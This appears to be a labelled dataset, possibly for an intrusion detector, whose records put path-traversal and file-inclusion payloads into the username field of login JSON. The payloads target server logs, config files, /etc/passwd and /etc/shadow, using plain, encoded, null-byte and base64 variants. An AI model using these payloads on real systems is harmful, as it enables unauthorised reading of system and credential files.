|{"username":"\/var\/log\/apache\/error_log","password":"128870836"}|,1
|{"username":"\/var\/log\/apache\/error.log","password":"402617562"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache\/error_log","password":"513229132"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache\/error.log","password":"1432344579"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/apache\/error_log","password":"1562879044"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/apache\/error.log","password":"1592991477"}|,1
|{"username":"\/var\/log\/apache-ssl\/access.log","password":"1491389014"}|,1
|{"username":"\/var\/log\/apache-ssl\/error.log","password":"1683705733"}|,1
|{"username":"\/var\/log\/auth","password":"1733625093"}|,1
|{"username":"\/var\/log\/authlog","password":"522026358"}|,1
|{"username":"\/var\/log\/auth.log","password":"1139197293"}|,1
|{"username":"\/var\/log\/boot.log","password":"149068065"}|,1
|{"username":"\/var\/log\/cron.log","password":"2109296158"}|,1
|{"username":"\/var\/log\/dmesg","password":"37762410"}|,1
|{"username":"\/var\/log\/error_log","password":"354738395"}|,1
|{"username":"\/var\/log\/error.log","password":"1383625042"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/error_log","password":"1768692146"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/error.log","password":"1628272192"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/error_log","password":"1210729669"}|,1
|{"username":"\/var\/log\/exim_mainlog","password":"112806419"}|,1
|{"username":"\/var\/log\/exim\/mainlog","password":"1491215924"}|,1
|{"username":"\/var\/log\/exim_paniclog","password":"2067910442"}|,1
|{"username":"\/var\/log\/exim\/paniclog","password":"370396900"}|,1
|{"username":"\/var\/log\/exim_rejectlog","password":"1484717395"}|,1
|{"username":"\/var\/log\/exim\/rejectlog","password":"456199338"}|,1
|{"username":"\/var\/log\/ftplog","password":"416995835"}|,1
|{"username":"\/var\/log\/ftp-proxy","password":"238878730"}|,1
|{"username":"\/var\/log\/ftp-proxy\/ftp-proxy.log","password":"2120579401"}|,1
|{"username":"\/var\/log\/httpd\/","password":"43968158"}|,1
|{"username":"\/var\/log\/httpd\/access_log","password":"624397771"}|,1
|{"username":"\/var\/log\/httpd\/access.log","password":"1100330934"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/httpd\/access_log","password":"1097970369"}|,1
|{"username":"\/var\/log\/httpd\/error_log","password":"803698306"}|,1
|{"username":"\/var\/log\/httpd\/error.log","password":"1325437542"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/httpd\/error_log","password":"804475018"}|,1
|{"username":"\/var\/log\/httpsd\/ssl.access_log","password":"1336021647"}|,1
|{"username":"\/var\/log\/httpsd\/ssl_log","password":"1509283145"}|,1
|{"username":"\/var\/log\/kern.log","password":"213238579"}|,1
|{"username":"\/var\/log\/lastlog","password":"854963855"}|,1
|{"username":"\/var\/log\/lighttpd","password":"1406515730"}|,1
|{"username":"\/var\/log\/maillog","password":"855261065"}|,1
|{"username":"\/var\/log\/message","password":"1335204994"}|,1
|{"username":"\/var\/log\/messages","password":"1776083489"}|,1
|{"username":"\/var\/log\/mysqlderror.log","password":"1063821915"}|,1
|{"username":"\/var\/log\/mysqld.log","password":"1295396342"}|,1
|{"username":"\/var\/log\/mysql.log","password":"762800508"}|,1
|{"username":"\/var\/log\/mysql\/mysql-bin.log","password":"957611447"}|,1
|{"username":"\/var\/log\/mysql\/mysql.log","password":"426037291"}|,1
|{"username":"\/var\/log\/mysql\/mysql-slow.log","password":"1883638789"}|,1
|{"username":"\/var\/log\/ncftpd.errs","password":"578495017"}|,1
|{"username":"\/var\/log\/ncftpd\/misclog.txt","password":"1290739593"}|,1
|{"username":"\/var\/log\/news","password":"1380451416"}|,1
|{"username":"\/var\/log\/news.all","password":"987583186"}|,1
|{"username":"\/var\/log\/news\/news","password":"320643"}|,1
|{"username":"\/var\/log\/news\/news.all","password":"780294200"}|,1
|{"username":"\/var\/log\/news\/news.crit","password":"208444041"}|,1
|{"username":"\/var\/log\/news\/news.err","password":"32220662"}|,1
|{"username":"\/var\/log\/news\/news.notice","password":"1175995384"}|,1
|{"username":"\/var\/log\/news\/suck.err","password":"976145241"}|,1
|{"username":"\/var\/log\/news\/suck.notice","password":"1145883209"}|,1
|{"username":"\/var\/log\/poplog","password":"1354112747"}|,1
|{"username":"\/var\/log\/POPlog","password":"1518293260"}|,1
|{"username":"\/var\/log\/proftpd","password":"1639737575"}|,1
|{"username":"\/var\/log\/proftpd.access_log","password":"1109227322"}|,1
|{"username":"\/var\/log\/proftpd.xferlog","password":"1569179071"}|,1
|{"username":"\/var\/log\/proftpd\/xferlog.legacy","password":"41226924"}|,1
|{"username":"\/var\/log\/pureftpd.log","password":"1492853406"}|,1
|{"username":"\/var\/log\/pure-ftpd\/pure-ftpd.log","password":"783858616"}|,1
|{"username":"\/var\/log\/qmail","password":"1380771039"}|,1
|{"username":"\/var\/log\/qmail\/","password":"1166200395"}|,1
|{"username":"\/var\/log\/samba","password":"2021825544"}|,1
|{"username":"\/var\/log\/samba-log.%m","password":"1555453567"}|,1
|{"username":"\/var\/log\/secure","password":"773308337"}|,1
|{"username":"\/var\/log\/smtpd","password":"1951697586"}|,1
|{"username":"\/var\/log\/spooler","password":"1405029001"}|,1
|{"username":"\/var\/log\/syslog","password":"156010930"}|,1
|{"username":"\/var\/log\/telnetd","password":"291826953"}|,1
|{"username":"\/var\/log\/thttpd_log","password":"1454058632"}|,1
|{"username":"\/var\/log\/utmp","password":"189321053"}|,1
|{"username":"\/var\/log\/vsftpd.log","password":"1840882477"}|,1
|{"username":"\/var\/log\/wtmp","password":"1606868035"}|,1
|{"username":"\/var\/log\/xferlog","password":"1960325086"}|,1
|{"username":"\/var\/log\/yum.log","password":"236940612"}|,1
|{"username":"\/var\/lp\/logs\/lpNet","password":"1612956788"}|,1
|{"username":"\/var\/lp\/logs\/lpsched","password":"1481141825"}|,1
|{"username":"\/var\/lp\/logs\/requests","password":"1867363165"}|,1
|{"username":"\/var\/mysql.log","password":"110387183"}|,1
|{"username":"\/var\/run\/httpd.pid","password":"803377663"}|,1
|{"username":"\/var\/run\/mysqld\/mysqld.pid","password":"545143342"}|,1
|{"username":"\/var\/run\/utmp","password":"596030977"}|,1
|{"username":"\/var\/saf\/_log","password":"1303800985"}|,1
|{"username":"\/var\/saf\/port\/log","password":"333287761"}|,1
|{"username":"\/var\/spool\/errors","password":"1384576985"}|,1
|{"username":"\/var\/spool\/locks","password":"1856564293"}|,1
|{"username":"\/var\/spool\/logs","password":"52402983"}|,1
|{"username":"\/var\/spool\/tmp","password":"1484451452"}|,1
|{"username":"\/var\/www\/conf\/httpd.conf","password":"1842951066"}|,1
|{"username":"\/var\/www\/html\/.htaccess","password":"666856167"}|,1
|{"username":"\/var\/www\/localhost\/htdocs\/.htaccess","password":"1642126491"}|,1
|{"username":"\/var\/www\/log\/access_log","password":"1254169418"}|,1
|{"username":"\/var\/www\/log\/error_log","password":"1417430749"}|,1
|{"username":"\/..\/..\/var\/www\/logs\/access_log","password":"173752831"}|,1
|{"username":"\/var\/www\/logs\/access_log","password":"1192749899"}|,1
|{"username":"\/var\/www\/logs\/access.log","password":"717438394"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/www\/logs\/access_log","password":"704153120"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/www\/logs\/access.log","password":"1882769673"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/www\/logs\/access.log","password":"607143079"}|,1
|{"username":"\/var\/www\/logs\/error_log","password":"1183369247"}|,1
|{"username":"\/var\/www\/logs\/error.log","password":"742775289"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/www\/logs\/error_log","password":"624283270"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/www\/logs\/error.log","password":"2064100735"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/www\/logs\/error_log","password":"725645677"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/www\/logs\/error.log","password":"986674331"}|,1
|{"username":"\/var\/www\/sitename\/htdocs\/","password":"1282746411"}|,1
|{"username":"\/var\/www\/vhosts\/sitename\/httpdocs\/.htaccess","password":"1686498821"}|,1
|{"username":"\/var\/www\/web1\/html\/.htaccess","password":"1541271308"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/opt\/apache2\/conf\/httpd.conf","password":"1281352648"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/opt\/apache\/conf\/httpd.conf","password":"26780787"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/opt\/httpd\/conf\/httpd.conf","password":"1775569144"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/usr\/local\/php4\/httpd.conf.php","password":"1849299553"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/usr\/local\/php5\/httpd.conf.php","password":"2078323388"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/usr\/local\/php\/httpd.conf.php","password":"689475743"}|,1
|{"username":"\/Volumes\/Macintosh_HD1\/usr\/local\/php\/lib\/php.ini","password":"238715274"}|,1
|{"username":"\/Volumes\/webBackup\/opt\/apache2\/conf\/httpd.conf","password":"784740062"}|,1
|{"username":"\/Volumes\/webBackup\/private\/etc\/httpd\/httpd.conf","password":"2009883057"}|,1
|{"username":"\/Volumes\/webBackup\/private\/etc\/httpd\/httpd.conf.default","password":"1688537783"}|,1
|{"username":"\/web\/conf\/php.ini","password":"170876582"}|,1
|{"username":"\/WINDOWSphp.ini","password":"1064227691"}|,1
|{"username":"..\/..\/windows\/win.ini","password":"1899294603"}|,1
|{"username":"\/WINNTphp.ini","password":"2068061196"}|,1
|{"username":"\/............winntwin.ini","password":"460543511"}|,1
|{"username":"\/www\/logs\/proftpd.system.log","password":"1772454433"}|,1
|{"username":"\/xamppapachebinphp.ini","password":"1959415788"}|,1
|{"username":"\/.Xauthority","password":"1082635282"}|,1
|{"username":"..2fapache2flogs2ferror.log","password":"423451728"}|,1
|{"username":"..2fapache2flogs2faccess.log","password":"1433115204"}|,1
|{"username":"..2f..2fapache2flogs2ferror.log","password":"767575187"}|,1
|{"username":"..2f..2fapache2flogs2faccess.log","password":"1666985865"}|,1
|{"username":"..2f..2f..2fapache2flogs2ferror.log","password":"908803668"}|,1
|{"username":"..2f..2f..2fapache2flogs2faccess.log","password":"1745855799"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log","password":"1260220086"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log","password":"1074501583"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log","password":"60602374"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log","password":"2068343719"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log","password":"679413889"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log","password":"578155308"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log","password":"1494097077"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log","password":"101830574"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log","password":"170065472"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log","password":"658615322"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log","password":"203098804"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log","password":"1816170279"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log","password":"1038770670"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log","password":"1940310585"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log","password":"1323329677"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log","password":"727955006"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l og","password":"2082521204"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l og","password":"408009837"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log","password":"855038984"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log","password":"1163098984"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log","password":"1711893091"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log","password":"1690399035"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log","password":"1431558291"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log","password":"822197740"}|,1
|{"username":"..2fetc2fpasswd","password":"163739759"}|,1
|{"username":"..2fetc2fpasswd%00","password":"291646302"}|,1
|{"username":"..2f..2fetc2fpasswd","password":"913713536"}|,1
|{"username":"..2f..2fetc2fpasswd%00","password":"2051522696"}|,1
|{"username":"..2f..2f..2fetc2fpasswd","password":"859294683"}|,1
|{"username":"..2f..2f..2fetc2fpasswd%00","password":"253383617"}|,1
|{"username":"..2f..2f..2f..2fetc2fpasswd","password":"773696121"}|,1
|{"username":"..2f..2f..2f..2fetc2fpasswd%00","password":"1761850430"}|,1
|{"username":"..2f..2f..2f..2f..2fetc2fpasswd","password":"1265460766"}|,1
|{"username":"..2f..2f..2f..2f..2fetc2fpasswd%00","password":"29713345"}|,1
|{"username":"..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"589079467"}|,1
|{"username":"..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1003821805"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"628873369"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"317855202"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"105326173"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1431727749"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"194440706"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"69046008"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"894162219"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1240679281"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1864962392"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"791856879"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"733683763"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"19105203"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1906789252"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1842980369"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1498077647"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"359565350"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"811946881"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1893188331"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"33962708"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1717304698"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1790426939"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1385888281"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1904603960"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"387767587"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1811925419"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1590058028"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"1390019538"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"2064165502"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"2032402848"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"588732021"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd","password":"550709513"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00","password":"1009057325"}|,1
|{"username":"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00","password":"1351231118"}|,1
|{"username":"L2V0Yy9tYXN0ZXIucGFzc3dk","password":"319507872"}|,1
|{"username":"L21hc3Rlci5wYXNzd2Q=","password":"99081637"}|,1
|{"username":"ZXRjL3Bhc3N3ZA==","password":"1764666002"}|,1
|{"username":"ZXRjL3NoYWRvdyUwMA==","password":"302683664"}|,1
|{"username":"L2V0Yy9wYXNzd2Q=","password":"1570794882"}|,1
|{"username":"L2V0Yy9wYXNzd2QlMDA=","password":"968658278"}|,1
|{"username":"Li4vZXRjL3Bhc3N3ZA==","password":"1642847083"}|,1
|{"username":"Li4vZXRjL3Bhc3N3ZCUwMA==","password":"796236816"}|,1
|{"username":"Li4vLi4vZXRjL3Bhc3N3ZA==","password":"190879010"}|,1
|{"username":"Li4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"1104718995"}|,1
|{"username":"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"1519366527"}|,1
|{"username":"Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"1705446186"}|,1
|{"username":"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"894608333"}|,1
|{"username":"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"144733444"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"1163797961"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"902789617"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"414130771"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"949903549"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"1519756082"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==","password":"2143234284"}|,1
|{"username":"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==","password":"1019258416"}|,1
